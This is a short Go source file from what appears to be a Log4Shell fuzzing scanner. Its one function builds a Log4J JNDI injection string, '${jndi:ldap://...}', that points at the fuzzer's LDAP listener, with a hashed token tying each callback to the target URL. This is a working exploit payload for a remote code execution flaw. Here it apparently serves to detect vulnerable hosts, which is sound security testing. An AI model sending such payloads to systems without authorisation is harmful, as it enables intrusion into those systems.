package l9l4gfuzz

import (
	"fmt"
	"time"
)

func (f *fuzzer) PayloadJNDILog4J(url string, source string) string {
	token := Token{
		SourceUrl:     url,
		PayloadSource: source,
		IssueDate:     time.Now(),
	}
	return fmt.Sprintf("${jndi:ldap://%s/%s}",
		f.listenAddress,
		f.tokenTranslator.GetHashFromToken(token))
}
